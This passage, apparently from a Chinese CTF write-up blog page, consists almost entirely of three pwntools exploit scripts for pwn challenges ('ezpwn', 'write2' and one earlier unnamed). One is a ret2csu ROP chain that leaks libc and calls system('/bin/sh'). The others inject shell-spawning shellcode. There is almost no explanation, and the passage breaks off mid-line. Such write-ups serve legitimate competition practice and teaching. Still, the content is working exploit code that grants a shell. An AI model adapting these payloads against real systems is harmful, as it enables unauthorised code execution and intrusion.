data-num=\"26\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000401333</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>rsi_r15_ret <span class=\"token operator\">=</span><span class=\"token number\">0x0000000000401331</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040101a</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>write_got<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>write_plt<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'try this\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'This challenge no backdoor!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>gadget_1 <span class=\"token operator\">=</span> <span class=\"token number\">0x40132A</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>gadget_2 <span class=\"token operator\">=</span> <span class=\"token number\">0x401310</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>gadget_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># rbx</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># rbp</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># r12</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token comment\"># r13</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># r14</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token comment\"># r15</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>gadget_2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token operator\">*</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04010D0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>write <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>base <span class=\"token operator\">=</span> write <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>system <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>binsh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>sl<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezpwn\"><a class=\"markdownIt-Anchor\" href=\"#ezpwn\">#</a> ezpwn</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote(\"pwn.node.game.sycsec.com\",31041)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># libc = ELF('/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\txor rax,rax</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tmov dx,0x100</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tsyscall</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>'''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>paylaod <span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\x00'</span> <span class=\"token operator\">+</span> shellcode</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>se<span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">9</span><span class=\"token operator\">+</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>se<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"write2\"><a class=\"markdownIt-Anchor\" href=\"#write2\">#</a> write2</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30069</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./chal')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>index_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x4</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>index_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05'</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sl<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'40'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'41'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'42'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'43'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token 